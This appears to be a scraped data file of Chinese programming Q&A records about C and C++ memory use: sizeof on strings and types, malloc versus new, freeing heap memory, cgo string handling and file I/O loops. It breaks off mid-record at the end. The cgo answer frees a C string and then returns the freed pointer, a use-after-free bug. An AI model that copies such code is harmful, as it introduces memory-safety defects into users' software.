{"Answer": "&lt;p&gt;sizeof(std::string)得到的是string类型的大小&amp;#xff0c;这个跟操作系统和编译器有关。&lt;br /&gt;在32位机器的 vc6.0下sizeof(string) &amp;#61;16&amp;#xff1b;但在VS2008下它是32.&lt;br /&gt;win7 64位系统下&amp;#xff0c;x86编译模式下大小是 32&lt;br /&gt;win10 64位系统下&amp;#xff0c;x86编译模式下大小是 28  &amp;#xff0c;x64编译模式下大小是40&lt;/p&gt;\n&lt;p&gt;如果要求字符串的长度&amp;#xff0c;用length()函数计算。&lt;br /&gt;可以看看下面的连接&amp;#xff1a;&lt;br /&gt;&lt;a href=\"https://www.cnblogs.com/wanghetao/archive/2012/04/04/2431760.html\" id=\"textarea_1645761398070_1645761603398_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;div class=\"md_link_card\"&gt;\n      \n        &lt;span class=\"md_link_title\"&gt;sizeof和sizeof(string)的问题 - wanghetao - 博客园&lt;/span&gt;\n        \n      &lt;span class=\"md_link_desc\" style=\"\"&gt;今天看《程序员面试宝典》一书&amp;#xff08;为了应付将要到来的微软笔试&amp;#xff09;&amp;#xff0c;看到了sizeof(string)这个问题。在Dev C&amp;#43;&amp;#43;上测试的结果是4&amp;#xff0c;很不明白。上网搜了一下&amp;#xff0c;得到如下结果&amp;#xff1a;string strAr&lt;/span&gt;\n      &lt;span class=\"md_flex_card\"&gt;\n      &lt;img class=\"md_link_img\" id=\"md_link_img\" src=\"https://common.cnblogs.com/favicon.svg\" /&gt;\n        &lt;span class=\"flex-1\"&gt;\n          &lt;span class=\"md_link_url\"&gt;https://www.cnblogs.com/wanghetao/archive/2012/04/04/2431760.html&lt;/span&gt;\n        &lt;/span&gt;\n      &lt;/span&gt;&lt;/div&gt;&lt;/a&gt;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于Clion和Vs中string内存大小问题", ["\n", "最近刚学习到结构体的大小问题，就跑了一下代码(windows系统下)，然后发现Clion和Vs中关于string的长度结果有出入。这是我测试过后得到的结果。", "\n", "佬们，求解为什么会有这样的差异，如果遇到一个填空题让我填写sizeof(std::string)的长度问题，我该如何作答呢？", "\n", "初学勿喷。感谢各位！"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img class=\"md_img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/766116935966154.png\" alt=\"img\" align=\"left\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;p&gt;看到这个返回代码了没&amp;#xff0c;不为0就表示程序异常退出。&lt;br /&gt;回归正题&amp;#xff0c;你这里可能的解决办法为第10行改成scanf_s(&amp;#34;%s&amp;#34;,arr1,100); vs种的scanf_s在以%s格式读取字符串时得写上第3个参数&amp;#xff0c;这个参数的意义表示最大读取的字节长度。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["大一c语言。要求：碰到er结尾单词，就显示。为什么会是这个结果？先初始定义一个字符串arr1，然后再输入一个字符串存进arr1，用sizeof来算有几个元素，然后访问字符串的倒数第一和第二位", ["大一c语言。要求：碰到er结尾单词，就显示。为什么会是这个结果？先初始定义一个字符串arr1，然后再输入一个字符串存进arr1，用sizeof来算有几个元素，然后访问字符串的倒数第一和第二位"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;\n&lt;code class=\"language-cpp\"&gt;#include &amp;lt;iostream&amp;gt;\nusing namespace std;\n#include &amp;lt;string&amp;gt;\n\nclass Students;\n\nclass Teachers\n{\nprivate:\n    Students *pStudents;\n\npublic:\n    string m_Name;\n    string m_ID;\n    // 1. 这些方法用了Students的具体方法, 虽然前面提前申明了Students, 但是没有具体定义是不行的, 所以需要放在后面实现\n    void CheckHomework();\n    Teachers();\n    ~Teachers();\n};\n\nclass Students\n{\n    // 2. 申明友元类需要用friend class, 非必须\n    friend class Teachers;\n\npublic:\n    Students() : m_Homework(&amp;#34;作业&amp;#34;)\n\n    {\n    }\n\n    string m_Name;\n\n    string m_StudyNumber;\n\nprivate:\n    string m_Homework;\n};\n\n// 3. Hint! Teachers的一些方法放在这里实现了, 即Students的定义之后\nvoid Teachers::CheckHomework()\n{\n    cout &amp;lt;&amp;lt; &amp;#34;正在检查&amp;#34; &amp;lt;&amp;lt; pStudents-&amp;gt;m_Homework &amp;lt;&amp;lt; endl;\n}\n\nTeachers::Teachers(){\n    pStudents &amp;#61; new Students();\n}\n\nTeachers::~Teachers(){\n    delete pStudents;\n    pStudents &amp;#61; nullptr;\n}\n\nvoid test01()\n\n{\n\n    Teachers tr1;\n\n    tr1.CheckHomework();\n}\n\nint main()\n\n{\n\n    test01();\n\n    system(&amp;#34;pause&amp;#34;);\n\n    return 0;\n}&lt;/code&gt;&lt;/pre&gt;\n\n&lt;p&gt;有三处注释&amp;#xff0c;题主可以看看。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么系统一直报错说：使用了未定义的类型Students？", ["\n", "#include<iostream>\nusing namespace std;\n#include<string>\nclass Students;\nclass Teachers\n{\nprivate:\n\tStudents* pStudents;\npublic:\n\tstring m_Name;\n\tstring m_ID;\n\tvoid CheckHomework()\n\t{\n\t\tcout << \"正在检查\" << pStudents->m_Homework << endl;\n\t}\n\n};\n\nclass Students\n{\n\tfriend Teachers;\npublic:\n\tStudents():m_Homework(\"作业\")\n\t{\n\n\t}\n\tstring m_Name;\n\tstring m_StudyNumber;\nprivate:\n\tstring m_Homework;\n};\n\nvoid test01()\n{\n\tTeachers tr1;\n\ttr1.CheckHomework();\n}\n\nint main()\n{\n\ttest01();\n\tsystem(\"pause\");\n\treturn 0;\n}\n"]], "Tag": "程序设计"}
{"Answer": "我明白了，3.14是double类型，但是i 是float类型。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++中float i=3.14;本应该是double类型，但是sizeof(i)测出来为什么是4字节而不是8字节", ["C++中float i=3.14;本应该是double类型，但是sizeof(i)测出来为什么是4字节而不是8字节", "\n#include ", "\nusing namespace std;", "\nint main()", "\n{", "\n    float i = 3.14;", "\n    cout << sizeof(i) << endl;", "\n}", "\n输出：4"]], "Tag": "程序设计"}
{"Answer": "&lt;div class=\"post-text\" itemprop=\"text\"&gt;\r\n&lt;blockquote&gt;\n  &lt;p&gt;&lt;a href=\"https://golang.org/cmd/cgo/\" rel=\"nofollow noreferrer\"&gt;Command cgo&lt;/a&gt;&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;// Go string to C string\n// The C string is allocated in the C heap using malloc.\n// It is the caller's responsibility to arrange for it to be\n// freed, such as by calling C.free (be sure to include stdlib.h\n// if C.free is needed).\nfunc C.CString(string) *C.char\n&lt;/code&gt;&lt;/pre&gt;\n  \n  &lt;p&gt;If the import of \"C\" is immediately preceded by a comment, that\n  comment, called the preamble, is used as a header when compiling the C\n  parts of the package.&lt;/p&gt;\n&lt;/blockquote&gt;\n\n&lt;p&gt;For example,&lt;/p&gt;\n\n&lt;pre&gt;&lt;code&gt;package main\n\n/*\n#include &amp;lt;stdlib.h&amp;gt;\n*/\nimport \"C\"\n\nimport \"unsafe\"\n\n//export HelloWorld\nfunc HelloWorld() *C.char {\n    cs := C.CString(\"Hello World!\")\n    C.free(unsafe.Pointer(cs))\n    return cs\n}\n\nfunc main() {}\n&lt;/code&gt;&lt;/pre&gt;\n    &lt;/div&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何释放C.CString分配的内存？", ["\n\n", "Here is my code:", "\n\n", "helloworld.go", ":", "\n\n", "package main\n\nimport \"C\"\nimport \"unsafe\"\n\n//export HelloWorld\nfunc HelloWorld() *C.char {\n    cs := C.CString(\"Hello World!\")\n    C.free(unsafe.Pointer(cs))\n    return cs\n}\n\nfunc main() {}\n", "\n\n", "One of the errors I got:", "\n\n", "src/helloworld.go:9:2: could not determine kind of name for C.free\n", "\n\n", "Based on this article: ", "https://blog.golang.org/c-go-cgo", "\n\n", "I also found out that I need to add ", "#include <stdlib.h>", " at top of my C file.", "\n\n", "helloworld.h", ":", "\n\n", "#include <stdlib.h>\n/* Created by \"go tool cgo\" - DO NOT EDIT. */\n\n/* package command-line-arguments */\n\n/* Start of preamble from import \"C\" comments.  */\n\n\n\n\n/* End of preamble from import \"C\" comments.  */\n\n\n/* Start of boilerplate cgo prologue.  */\n#line 1 \"cgo-gcc-export-header-prolog\"\n\n#ifndef GO_CGO_PROLOGUE_H\n#define GO_CGO_PROLOGUE_H\n\ntypedef signed char GoInt8;\ntypedef unsigned char GoUint8;\ntypedef short GoInt16;\ntypedef unsigned short GoUint16;\ntypedef int GoInt32;\ntypedef unsigned int GoUint32;\ntypedef long long GoInt64;\ntypedef unsigned long long GoUint64;\ntypedef GoInt64 GoInt;\ntypedef GoUint64 GoUint;\ntypedef __SIZE_TYPE__ GoUintptr;\ntypedef float GoFloat32;\ntypedef double GoFloat64;\ntypedef float _Complex GoComplex64;\ntypedef double _Complex GoComplex128;\n\n/*\n  static assertion to make sure the file is being used on architecture\n  at least with matching size of GoInt.\n*/\ntypedef char _check_for_64_bit_pointer_matching_GoInt[sizeof(void*)==64/8 ? 1:-1];\n\ntypedef struct { const char *p; GoInt n; } GoString;\ntypedef void *GoMap;\ntypedef void *GoChan;\ntypedef struct { void *t; void *v; } GoInterface;\ntypedef struct { void *data; GoInt len; GoInt cap; } GoSlice;\n\n#endif\n\n/* End of boilerplate cgo prologue.  */\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n\nextern char* HelloWorld();\n\n#ifdef __cplusplus\n}\n#endif\n", "\n\n", "I tried it to no success.", "\n\n", "I need to free the memory.", "\n\n", "How do I do this? Because in there example it prints out the string. I want to return it. Without C.free. I am able to do it. I am just worried of causing a memory leak or some other issue.", "\n    "]], "Tag": "程序设计"}
{"Answer": "最好把你的错误截个图，然后找一下你生成的EXE，所在的路径也顺便贴一下。\r\n查看“项目”-“属性”-“链接器”-“常规”-“输出文件”，路劲是否是“bin/xxx.exe”，如果是请继续看我的解答，否则请忽略下面的内容。\r\n如果你生成的exe是存在的，不过是在工程的bin目录下。但是在VS中是执行的时候是要到Debug中找的，所以你需要修改项目的输出路径，即“项目”-“属性”-“链接器”-“常规”-“输出文件”，将“bin”修改为“Debug”", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++ Primer plus上第四章的程序清单例题，在vs里面总显示错误：", ["\n", "#include", "\n#include", "\nusing namespace std;", "\nchar* getname(void);", "\nint main() {", "\n  char* name;", "\n  name = getname();", "\n  cout << name << \" at \" << (int*)name << endl;", "\n  delete [] name;", "\n  system(\"pause\");", "\n}", "\n\n", "char * getname() {", "\n  char temp[80];", "\n  cout << \"enter your last name: \";", "\n  cin >> temp;", "\n  char* pn = new char[strlen(temp) + 1];", "\n  strcpy(pn, temp);", "\n  return pn;", "\n }", "\n", "\n\n", "错误理由一直是“系统找不到指定的文件”，不管是重新生成解决方案也好也没有用，求大神指导", "\n\n", "错误截图：", "\n\n", "还有就是我的是vs2015"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;&lt;a href=\"https://en.cppreference.com/w/c/io/fopen\" id=\"textarea_1640755856967_1640756342910_0\" target=\"_blank\" rel=\"noopener noreferrer\"&gt;&lt;span class=\"md_link_url\"&gt;https://en.cppreference.com/w/c/io/fopen&lt;/span&gt;&lt;/a&gt;&lt;br /&gt;官网手册上写了&amp;#xff0c;&amp;#xff08;r&amp;#43;/w&amp;#43;&amp;#xff09;更新模式下&amp;#xff0c;写之后读&amp;#xff0c;必须要flush或设置文件读写指针&amp;#xff0c;读之后写&amp;#xff0c;必须要设置文件读写指针&amp;#xff0c;&lt;br /&gt;就是你对同一个文件putc之后又getc&amp;#xff0c;这个用法不对&lt;br /&gt;可以在putc后面加一句 fflush来解决&lt;/p&gt;\n&lt;p&gt;另外&amp;#xff0c;&lt;br /&gt;你一个新手还搞这种复杂的文件操作。。。&lt;br /&gt;这个知识点十年老程序员都不知道要查了才知道。。。&lt;/p&gt;\n&lt;p&gt;建议读一个文件&amp;#xff0c;写到另一个文件。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言，用getc读取，while((ch=getc(fp))!=EOF)  为什么是死循环", ["请看这个程序：", "\n", "#", "include", "<stdio.h>", "\n\n", "#", "include", "<string.h>", "\n\n", "#", "include", "<stdlib.h>", "\n\n", "#", "include", "<ctype.h>", "\n\n", "int", " ", "main", "(", "void", ")", "\n\n", "{\n    ", "char", " ch,ch1;\n    \n    ", "long", " num;\n    \n    FILE *fp;\n    \n    fp=", "fopen", "(", "\"122802f.txt\"", ",", "\"r+\"", ");\n    \n    ", "if", "(fp==", "NULL", ")\n    \n    ", "printf", "(", "\"Open Failed! \\n\"", ");\n    \n    ", "else", " \n    \n    ", "printf", "(", "\"Open Success! \\n\"", ");\n    \n    ", "rewind", "(fp);\n    \n    ", "while", "((ch=", "getc", "(fp))!=EOF)\n    \n    {\n        \n        \n        ", "fseek", "(fp,-", "sizeof", "(", "char", "),SEEK_CUR); \n        \n        ", "putc", "(", "tolower", "(ch),fp);    \n        \n        num=", "ftell", "(fp);\n        \n        ", "printf", "(", "\"the num is %ld.\\n \"", ",num);\n        \n    }\n    \n    ", "printf", "(", "\"Done! \\n\"", ");\n    \n    ", "fclose", "(fp);\n    \n    ", "return", " ", "0", ";\n    \n}\n\n\n", "\n", "我用的是  Dev-c, 测试的总是死循环，为什么？   是不是 122802f.txt  文件里的内容需要，比如结尾处  需要特殊处理？"]], "Tag": "程序设计"}
{"Answer": "问题在于对结构体变量的指针，遗漏了对其malloc开辟空间。刚开始只是对结构体中的*Elements 开辟了空间。\r\nPriorityQueue Initialize (int MaxElements)\r\n{\r\n\tPriorityQueue H;           //数组型\r\n\tif(MaxElements&lt;MinPQSize)\r\n\t\tError(\"Priority queue size is too small\");\r\n\r\n\tH=(struct HeapStruct*)malloc(sizeof(struct HeapStruct));                    ///////此步骤重要！！！！！！！！！！！！！\r\n\tif(H==NULL)\r\n\t\tError(\"Out of space!\");\r\n\r\n\tH-&gt;Elements=(int *)malloc(sizeof(ElementType)*(MaxElements+1));\t\r\n\tif(H-&gt;Elements==NULL)\r\n\t\tError(\"Out of space!\");\r\n\r\n\tH-&gt;Capacity=MaxElements;\r\n\tH-&gt;Size=0;\r\n\tH-&gt;Elements[0]=MinData;                   //MinData  \r\n\treturn H;\r\n}\r\n\r\n```\r\n \r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["优先队列问题。编译可通，无法运行。单步调试出错0xC0000005:Access Violation", ["编译可通过，无法运行：", "\n单步调试，此处出错：", "\n代码如下：", "\n\n", " #ifndef _BinHeap_H\n\nstruct HeapStruct;\ntypedef struct HeapStruct *PriorityQueue;\n\ntypedef int ElementType;\n\nPriorityQueue Initialize(int MaxElements);\nvoid Destroy (PriorityQueue H);\nvoid MakeEmpty(PriorityQueue H);\nvoid Insert(ElementType X,PriorityQueue H);\nElementType DeleteMin(PriorityQueue H);\nElementType FindMin(PriorityQueue H);\nint IsEmpty(PriorityQueue H);\nint Isfull(PriorityQueue H);\n\nstruct HeapStruct\n{\n    int Capacity;\n    int Size;\n    ElementType *Elements;\n};\n\n#endif \n\n", "\n\n", " #include \"BinHeap.h\"\n#include <stdio.h>\n#include <stdlib.h>\n\n#define MinPQSize 5\n#define MinData 0\n\n//int MaxElements=19;\n\nvoid Error(char *str)  \n{  \n    printf(\"%s\\n\", str);  \n    exit(0);  \n}\n\nint Isfull(PriorityQueue H)\n{\n    if(H->Size>H->Capacity)\n        return 1;\n    else\n        return 0;\n}  \n\nint IsEmpty(PriorityQueue H)\n{\n    if(H->Size==0)\n        return 1;\n    else\n        return 0;\n}\n\n//初始化优先队列\nPriorityQueue Initialize (int MaxElements)\n{\n    PriorityQueue H;           //数组型\n    if(MaxElements<MinPQSize)\n        Error(\"Priority queue size is too small\");\n\n    H->Elements=(int *)malloc((MaxElements+1)*sizeof(ElementType));\n\n    if(H->Elements==NULL)\n        Error(\"Out of space!\");\n\n    for(int i=0;i<=MaxElements;i++)           //数组元素置NULL\n    {\n        H->Elements[i]=NULL;\n    }\n\n    H->Capacity=MaxElements;\n    H->Size=0;\n    H->Elements[0]=MinData;                   //MinData  \n\n\n\n    return H;\n}\n\n//插入操作    Percolate up    上滤    最小的元素在根部\nvoid Insert(ElementType X,PriorityQueue H)\n{\n    int i;\n    if(Isfull(H))\n    {\n        Error(\"Priority queue is full\");\n        return;\n    }\n\n    for(i=++H->Size;H->Elements[i/2]>X;i/=2)\n        H->Elements[i]=H->Elements[i/2];\n    H->Elements[i]=X;\n}\n\n//DeleteMin    percolate down    下滤    用最后的元素作最后一步空穴填充\nElementType DeleteMin(PriorityQueue H)\n{\n    int i,Child;\n    ElementType MinElement,LastElement;\n\n    if(IsEmpty(H))\n    {\n        Error(\"Priority queue is empty\");\n        return H->Elements[0];\n    }\n\n    MinElement=H->Elements[1];\n    LastElement=H->Elements[H->Size--];\n\n    for(i=1;i*2<=H->Size;i=Child)\n    {\n        Child=i*2;\n        if(Child!=H->Size&&H->Elements[Child+1]<H->Elements[Child])\n            Child++;\n        if(LastElement>H->Elements[Child])\n            H->Elements[i]=H->Elements[Child];\n        else break;\n    }\n    H->Elements[i]=LastElement;\n    return MinElement;\n}\n\n//PercolateDown(i)\nPriorityQueue PercolateDown(int i,PriorityQueue H)\n{\n    int C=i*2;\n    int j=i;\n    ElementType Middle;\n\n    for(j;j*2<=H->Size;j=C)\n    {\n        C=j*2;\n        if(H->Elements[C+1]<H->Elements[C])\n            C++;\n        if(H->Elements[j]>H->Elements[C])\n        {\n            Middle=H->Elements[C];\n            H->Elements[C]=H->Elements[j];\n            H->Elements[j]=Middle;\n        }\n\n        else break;\n    }\n\n    return H;\n}\n\n\n//BuildHeap    构建堆\nPriorityQueue BuildHeap(ElementType *X,int N)\n{\n    int i;\n    PriorityQueue H=NULL;                     //定义个空数组H\n    H=Initialize (2*N);\n\n    for(i=0;i<N;i++)\n    {\n        H->Elements[i+1]=X[i];                //将堆的元素直接放入数组中\n    }\n\n    for(i=N/2;i>0;i--)                        //由上一个for循环结束时，得i=N. 则倒序Procolate Down.\n    {\n        PercolateDown(i,H);\n    }\n\n    return H;\n}\n\n\nvoid main()\n{\n    PriorityQueue h;\n\n    int x[]={13,21,16,24,31};\n    h=BuildHeap(x,11);\n    Insert(19,h);\n    Insert(68,h);\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "数据类型占内存的位数实际上与操作系统的位数和编译器（不同编译器支持的位数可能有所不同）都有关。\r\nshort和int型至少为16位，long型至少为32位。int型不能超过long型。\r\n例如，GCC编译器下32位机器，int和long int都是4个字节。在64位机器，int为4个字节，long int 为8个字节。\r\n更多详情，可看The C Programming language 这本书", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为啥我编译的时候C语言的int类型和long int类型占用字节一样呢？", ["今天在输出的时候发现int类型和long int类型占用字节一样，查了很多资料都没找到原因，望大佬解惑，感激", "\n源码", "\n\n", "#include <stdio.h>\nint main()\n{\n    printf(\"\\n%d,%d\",sizeof(int),sizeof(long));\n    return 0;\n}\n", "\n\n", "运行结果", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;C中的转义字符包括&amp;#xff1a;&lt;br /&gt;\n\\0  \\n  \\r  \\t  \\v  \\a  \\b  \\f  \\&amp;#39;  \\&amp;#34;  \\\\   \\?  \\ddd  \\xhh&lt;br /&gt;\n前面几个就不用说了&amp;#xff0c;主要是\\ddd和\\xhh&amp;#xff0c;其中\\ddd后面需要3位八进制数&amp;#xff0c;&lt;br /&gt;\n\\xhh这个的\\x后面跟两位十六进制数。&lt;br /&gt;\n所以从&amp;#34;\\abc\\027\\xah&amp;#34;来看&amp;#xff0c;\\a是一个字符&amp;#xff0c;b、c各是一个字符&amp;#xff0c;\\027满足\\ddd的要求&amp;#xff0c;所以\\027是一个字符&amp;#xff0c;&lt;br /&gt;\n\\xah这里&amp;#xff0c;因为\\x后面要求是两位十六进制数&amp;#xff0c;但是h不是十六进制数&amp;#xff0c;所以只能\\xa是一个字符&amp;#xff0c;h是一个字符&amp;#xff0c;&lt;br /&gt;\n这样一共是6个字符&amp;#xff0c;字符串以\\0结束&amp;#xff0c;所以还要加上1&amp;#xff0c;一共是7个字符。&lt;/p&gt;\n\n&lt;p&gt;如有帮助&amp;#xff0c;请采纳一下&amp;#xff0c;谢谢。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["char a []=\"\\abc\\027\\xah\",怎么看sizeof（a）是7的，", ["char a []=\"\\abc\\027\\xah\",怎么看sizeof（a），里面的三个转义符号是什么用的"]], "Tag": "程序设计"}
{"Answer": "调试下代码，看看dic1和dic是不是已经释放，释放了2次，或者是野指针。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为啥开辟的堆内存释放不了？", ["#include<stdio.h>\n#include<stdlib.h>\n#pragma warning(disable:4996)\n#include<time.h>\n\n//1.定义一个结构体\nstruct dicts\n{\n    char * word;\n    char * trans;\n};\n\n int main(void)\n{\n     int MAXNUM = 0;\n     char arr[1024] = { 0 };\n     int i = 0;\n\n\n     FILE * fp = fopen(\"D:\\\\dict.txt\", \"r\");\n     if (!fp)\n     {\n         printf(\"文件打开失败！\");\n         return -1;\n     }\n\n     while (!feof(fp))\n     {\n         fgets(arr, 1024, fp);\n         i++;\n     }\n     MAXNUM = i / 2;\n     printf(\"共收录%d个单词\\n\", MAXNUM);\n\n     struct dicts * dic = (struct dicts *) malloc(sizeof(struct dicts)*MAXNUM);\n     struct dicts * dic1 = (struct dicts *) malloc(sizeof(struct dicts));\n\n\n     dic1->word = '\\0';\n     dic1->trans = '\\0';\n\n     rewind(fp);\n     //将所有的单词都读取到dic中\n     i = 0;\n     while (!feof(fp))\n     {\n         //printf(\"%d\\n\", i);\n         memset(arr, 0, 1024);\n         fgets(arr, 1024, fp);\n         //printf(\"%s\\n\", arr);\n         dic[i].word = (char *)malloc(strlen(arr) + 1);\n         memset(dic[i].word, 0, strlen(arr) + 1);\n         strncpy(dic[i].word, arr, strlen(arr) + 1);\n\n         memset(arr, 0, 1024);\n         fgets(arr, 1024, fp);\n         //printf(\"%s\\n\", arr);\n         dic[i].trans = (char *)malloc(strlen(arr) + 1);\n         memset(dic[i].trans, 0, strlen(arr) + 1);\n         strncpy(dic[i].trans, arr, strlen(arr) + 1);\n\n         i++;\n         //printf(\"%d\\n\", i);\n     }\n\n     fclose(fp);\n\n     time_t start_time;\n     time_t end_time;\n\n     while (1)\n     {\n         printf(\"请输入要查找的单词(若想退出请输入“exit()”):\\n\");\n         while (1)\n         {\n             memset(arr, 0, 1024);\n             scanf(\"%s\", arr);\n             if (strlen(arr) > 1024)\n             {\n                 printf(\"输入的字符数过大，请从新输入！\\n\");\n             }\n             else\n             {\n                 break;\n             }\n         }\n         getchar();//接收回车\n\n         if (!strncmp(arr, \"exit()\", 6))\n         {\n             printf(\"退出成功！\\n\");\n             break;\n         }\n\n         //将arr中的单词改成标准格式  #单词\n         int len = strlen(arr);\n         for (int j = 0; j < len; j++)\n         {\n             arr[len - j] = arr[len - j - 1];\n         }\n         arr[0] = '#';\n\n         i = 0;\n         //查找单词\n         printf(\"正在查找，请稍后......\\n\");\n         start_time = time(NULL);\n         while (1)\n         {\n\n             if (!strncmp(arr, dic[i].word, strlen(arr)))\n             {\n                 dic1->word = (char*)malloc(strlen(arr) + 1);\n                 strncpy(dic1->word, arr, strlen(arr) + 1);\n\n                 dic1->trans = (char *)malloc(strlen(dic[i].trans) + 1);\n                 strncpy(dic1->trans, dic[i].trans, strlen(dic[i].trans) + 1);\n\n                 printf(\"%s\\n\", dic1->word);\n                 printf(\"%s\\n\", dic1->trans);\n                 free(dic1->trans);\n                 free(dic1->word);\n\n                 break;\n             }\n\n             i++;\n             if (i >= MAXNUM)\n             {\n                 printf(\"没有查找到该单词！\\n\");\n                 break;\n             }\n         }\n\n         end_time = time(NULL);\n         printf(\"本次查询用时：%ld(s)\\n\", (long)(end_time - start_time));\n\n     }\n\n     for ( i = 0; i < MAXNUM; i++)\n     {\n         free(dic[i].word);\n         free(dic[i].trans);\n     }\n\n     free(dic1);\n     free(dic);\n\n     return 0;\n}\n", "\n\n", "为啥最后输入exit()后，最后两行 free(dic1)和 free(dic)释放不了，老是卡在这运行不了。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;因为char *str是一个指针&amp;#xff0c;指针变量是可以接受malloc分配的内存。&lt;br /&gt;这个程序里strings应该是一个二维数组&amp;#xff0c;数组本身就有自己分配的内存&amp;#xff0c;怎么能够把内存空间分配给已经有的内存空间呢&amp;#xff1f;这是不被允许的。&lt;br /&gt;string[i]&amp;#61;str;这句话是把指针变量所指定的这段数据&amp;#xff0c;直接复制给了string[i]这段内存里。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["内存分配细节malloc", ["为什么要这样写", "\n", "        ", "char", "* ", "str", " = (", "char", "*)malloc(sizeof(", "char", ")*", "15", ");\n        scanf(", "\"%s\"", ", ", "str", ");\n        strings[i] = ", "str", ";\n", "\n", "而不这样写", "\n", "        strings[i] = (", "char", "*)", "malloc", "(", "sizeof", "(", "char", ") * ", "15", ");\n        ", "scanf", "(", "\"%s\"", ", strings[i]);\n        ", "//strings[i] = str;", "\n", "\n", "为什么要再定义一个中间量"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;下面代码&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;q&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; (string*)malloc(sizeof(string) * &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;应该改为&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-attribute\"&gt;q&lt;/span&gt; &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; new string[&lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;]&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;code class=\"language-javascript\"&gt;malloc&lt;/code&gt;和&lt;code class=\"language-javascript\"&gt;new&lt;/code&gt;的区别在于&amp;#xff0c;&lt;code class=\"language-javascript\"&gt;malloc&lt;/code&gt;只是分配一定大小的内存&amp;#xff0c;而&lt;code class=\"language-javascript\"&gt;new&lt;/code&gt;除了分配内存外&amp;#xff0c;还会调用类的构造函数进行初始化。在你的代码里&amp;#xff0c;malloc只是分配了内存而没有对string类对象进行初始化&amp;#xff0c;其类对象内部数据是无效的&amp;#xff0c;使用时就会出问题。所以C&amp;#43;&amp;#43;代码里应该用new/delete替换C语言中malloc/free。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++ 用malloc开辟String类型的空间，用cin赋值出现问题", ["我开辟一个string类型的空间，大小为3。不为NULL，但是赋值的时候就出现问题。无论用cin赋值还是直接赋值都出现问题。", "源代码如下：", "\n", "    ", "string", "* q;\n    q = (", "string", "*)malloc(", "sizeof", "(", "string", ") * ", "3", ");\n    ", "if", " (q)\n    {\n        ", "for", " (", "int", " i = ", "0", "; i < ", "3", "; i++)\n        {\n            cin >> *(q+i);\n        }\n    }\n    ", "for", " (", "int", " i = ", "0", "; i < ", "3", "; i++)\n    {\n        cout << *(q + i) << endl;\n    }\n", "\n", "我刚输入第一个字符串就出现问题：", "\n", "是string类型会出现内存泄漏还是我代码写的有问题？", "请大家帮我看一下"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;修改了一下CreateList函数和show函数&amp;#xff0c;加入了几个头文件&amp;#xff0c;然后发现问题好像是LinkList好像是值传递&amp;#xff0c;不是指针传递&amp;#xff0c;稍微修改了一下&amp;#xff0c;供参考&amp;#xff1a;&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-c\"&gt;\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;\nusing namespace std;\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;string&amp;gt;&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;stdlib.h&amp;gt; &lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#include &amp;lt;time.h&amp;gt; &lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#define OK 1&lt;/span&gt;\n&lt;span class=\"hljs-comment\"&gt;#define ERROR 0&lt;/span&gt;\n \ntypedef int ElemType;\ntypedef struct Node{\n    ElemType data;\n    struct Node *&lt;span class=\"hljs-keyword\"&gt;next&lt;/span&gt;;\n    int Length &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n};\ntypedef struct Node  LinkList;\n \n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;void InitList(LinkList *L){  &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;初始化 表长设为&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;    LinkList p;\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;    p-&amp;gt;Length &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;}\n \nint LengList(LinkList *L){\n    LinkList * p&amp;#61;L;\n    